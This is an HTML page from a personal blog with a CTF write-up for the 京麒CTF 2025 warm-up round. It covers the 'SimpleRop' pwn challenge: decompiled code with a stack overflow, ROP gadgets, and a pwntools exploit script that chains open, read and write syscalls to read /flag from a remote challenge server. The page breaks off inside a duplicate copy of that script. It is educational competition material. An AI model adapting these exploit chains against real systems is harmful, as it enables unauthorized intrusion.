<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>京麒CTF 2025 热身赛 WriteUp | 花盆</title><meta name="author" content="LittFlower"/><meta property="og:title" content="京麒CTF 2025 热身赛 WriteUp | 花盆"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/jinglinctf2025-writeup/README.mdx"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="stylesheet" href="/fonts.css" type="text/css" preload/><link rel="stylesheet" href="/style.css" type="text/css" preload/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="ctf-2025-writeup" class="scroll-target"><a href="#ctf-2025-writeup"><code class="hash inline-code">#</code>京麒CTF 2025 热身赛 WriteUp</a></h1>
<h2 id="simplerop" class="scroll-target"><a href="#simplerop"><code class="hash inline-code">#</code>SimpleRop</a></h2>
<p>保护：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-text">Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-text">Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
</code></pre></div>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-c language-c"><span style="color:#393A34">__int64 </span><span style="color:#59873A">init</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#59873A">  setvbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdout</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  setvbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdin</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  setvbuf</span><span style="color:#1e754f">(</span><span style="color:#393A34">stderr</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  return</span><span style="color:#59873A"> close</span><span style="color:#1e754f">(</span><span style="color:#2F798A">2</span><span style="color:#AB5959">LL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br><br><span style="color:#393A34">__int64 __fastcall </span><span style="color:#59873A">vuln</span><span style="color:#2993a3">(</span><span style="color:#393A34">__int64 </span><span style="color:#B07D48">a1</span><span style="color:#999999">,</span><span style="color:#393A34"> __int64 </span><span style="color:#B07D48">a2</span><span style="color:#2993a3">)</span><br><span style="color:#2993a3">{</span><br><span style="color:#393A34">  __int64 v2</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rdx</span><br><span style="color:#393A34">  __int64 v3</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // rcx</span><br><span style="color:#393A34">  __int64 v4</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // r8</span><br><span style="color:#393A34">  __int64 v5</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // r9</span><br><span style="color:#AB5959">  unsigned</span><span style="color:#AB5959"> int</span><span style="color:#393A34"> v7</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+0h] [rbp-40h]</span><br><span style="color:#393A34">  __int64 v8</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // [rsp+8h] [rbp-38h] BYREF</span><br><br><span style="color:#59873A">  random_fd</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">  v7 </span><span style="color:#999999">=</span><span style="color:#59873A"> dup</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#AB5959">LL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  close</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#AB5959">LL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  random_fd</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">  seccomp_orw_only</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#393A34"> a2</span><span style="color:#999999">,</span><span style="color:#393A34"> v2</span><span style="color:#999999">,</span><span style="color:#393A34"> v3</span><span style="color:#999999">,</span><span style="color:#393A34"> v4</span><span style="color:#999999">,</span><span style="color:#393A34"> v5</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0">  // sandbox</span><br><span style="color:#59873A">  write</span><span style="color:#1e754f">(</span><span style="color:#393A34">v7</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">Let me see see your rop skill</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">1E</span><span style="color:#AB5959">uLL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">  return</span><span style="color:#59873A"> read</span><span style="color:#1e754f">(</span><span style="color:#2F798A">0</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#AB5959"> &#x26;</span><span style="color:#393A34">v8</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1024</span><span style="color:#AB5959">LL</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0">  // stack overflow</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#DBD7CAEE">__int64 </span><span style="color:#80A665">init</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#80A665">  setvbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdout</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676">LL</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#CB7676">LL</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676">LL</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  setvbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stdin</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676">LL</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#CB7676">LL</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676">LL</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  setvbuf</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stderr</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676">LL</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#CB7676">LL</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#CB7676">LL</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  return</span><span style="color:#80A665"> close</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">2</span><span style="color:#CB7676">LL</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br><br><span style="color:#DBD7CAEE">__int64 __fastcall </span><span style="color:#80A665">vuln</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">__int64 </span><span style="color:#BD976A">a1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> __int64 </span><span style="color:#BD976A">a2</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#DBD7CAEE">  __int64 v2</span><span style="color:#666666">;</span><span style="color:#758575DD"> // rdx</span><br><span style="color:#DBD7CAEE">  __int64 v3</span><span style="color:#666666">;</span><span style="color:#758575DD"> // rcx</span><br><span style="color:#DBD7CAEE">  __int64 v4</span><span style="color:#666666">;</span><span style="color:#758575DD"> // r8</span><br><span style="color:#DBD7CAEE">  __int64 v5</span><span style="color:#666666">;</span><span style="color:#758575DD"> // r9</span><br><span style="color:#CB7676">  unsigned</span><span style="color:#CB7676"> int</span><span style="color:#DBD7CAEE"> v7</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+0h] [rbp-40h]</span><br><span style="color:#DBD7CAEE">  __int64 v8</span><span style="color:#666666">;</span><span style="color:#758575DD"> // [rsp+8h] [rbp-38h] BYREF</span><br><br><span style="color:#80A665">  random_fd</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">  v7 </span><span style="color:#666666">=</span><span style="color:#80A665"> dup</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">1</span><span style="color:#CB7676">LL</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  close</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">1</span><span style="color:#CB7676">LL</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  random_fd</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  seccomp_orw_only</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">1</span><span style="color:#CB7676">LL</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> a2</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> v2</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> v3</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> v4</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> v5</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><span style="color:#758575DD">  // sandbox</span><br><span style="color:#80A665">  write</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">v7</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Let me see see your rop skill</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">1E</span><span style="color:#CB7676">uLL</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  return</span><span style="color:#80A665"> read</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">0</span><span style="color:#CB7676">LL</span><span style="color:#666666">,</span><span style="color:#CB7676"> &#x26;</span><span style="color:#DBD7CAEE">v8</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1024</span><span style="color:#CB7676">LL</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><span style="color:#758575DD">  // stack overflow</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>题目给了几乎无限的栈溢出，但是只能打 orw，且程序 <code class="inline-code">close</code> 了 1，2，而且在 <code class="inline-code">dup</code> 前后随机申请了若干个 fd，但是 <code class="inline-code">v7</code> 作为 <code class="inline-code">dup</code> 出来的 fd 并没有 close，所以还是可以打。</p>
<p>有两种写法，第一种是用妙妙 gadget 把 v7 的那个值存下来：</p>
<p>gadget1:</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-text">0x0000000000448c55: mov rdi, qword ptr [r12]; call rbx;
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-text">0x0000000000448c55: mov rdi, qword ptr [r12]; call rbx;
</code></pre></div>
<p>gadget2:</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-text">0x0000000000427720: mov rdx, qword ptr [rsi - 8]; mov qword ptr [rdi - 8], rdx; ret;
</code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-text">0x0000000000427720: mov rdx, qword ptr [rsi - 8]; mov qword ptr [rdi - 8], rdx; ret;
</code></pre></div>
<p>选择这个 gadget2 是因为注意到程序在溢出时 rsi 寄存器上存放了 <code class="inline-code">v7</code> 的栈地址 + 8。</p>
<p>第二种是用爆破的思路（daimi 师傅的写法）</p>
<p>简单来说就是用 <code class="inline-code">leave; ret</code> 实现 <code class="inline-code">jmp</code> 的效果，从而爆破 fd。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#AB5959">*</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./pwn1</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">39.106.16.204</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 62123</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    b *0x401afc</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00000000004021cf</span><br><span style="color:#393A34">pop_rsi_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000040a23e</span><br><span style="color:#393A34">pop_rdx_rbx_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000047fbab</span><br><span style="color:#393A34">pop_rax_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">00000000004487a7</span><br><span style="color:#393A34">syscall </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000000414f46</span><br><span style="color:#393A34">main </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">401AE2</span><br><span style="color:#393A34">mov_rdi_rax_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000000480192</span><br><span style="color:#393A34">pop_r12_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000040262d</span><br><br><span style="color:#A0ADA0"># 0x0000000000427720: mov rdx, qword ptr [rsi - 8]; mov qword ptr [rdi - 8], rdx; ret;</span><br><span style="color:#A0ADA0"># 0x0000000000448c55: mov rdi, qword ptr [r12]; call rbx;</span><br><span style="color:#A0ADA0"># 0x000000000046d4d3: mov eax, 1; ret;</span><br><br><span style="color:#393A34">pop_rcx_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000000471183</span><br><span style="color:#393A34">magic </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000000427720</span><br><span style="color:#393A34">mov_rdi_r12_call </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">448c55</span><br><span style="color:#393A34">pop_rbx_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">0000000000401c00</span><br><span style="color:#393A34">write </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">447C20</span><br><span style="color:#393A34">mov_rax_r8_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">44ac44</span><br><span style="color:#393A34">mov_eax_1_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">46d4d3</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 64</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4c9608</span><span style="color:#999999">,</span><span style="color:#393A34"> magic</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4c9000</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_rbx_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">30</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rax_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">  # read</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4c9000</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 4</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rax_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_rbx_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">  # open</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">mov_rdi_rax_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rsi_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4c9500</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdx_rbx_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">50</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rax_ret</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> syscall</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">  # read</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">pop_r12_ret</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4c9600</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rbx_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> write</span><span style="color:#999999">,</span><span style="color:#393A34"> mov_rdi_r12_call</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0">  # write</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">sleep</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0.5</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/flag</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#CB7676">*</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./pwn1</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">39.106.16.204</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 62123</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> """</span><br><span style="color:#C98A7D">    b *0x401afc</span><br><span style="color:#C98A7D77">    """</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">pop_rdi_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00000000004021cf</span><br><span style="color:#DBD7CAEE">pop_rsi_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000040a23e</span><br><span style="color:#DBD7CAEE">pop_rdx_rbx_ret </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000047fbab</span><br><span 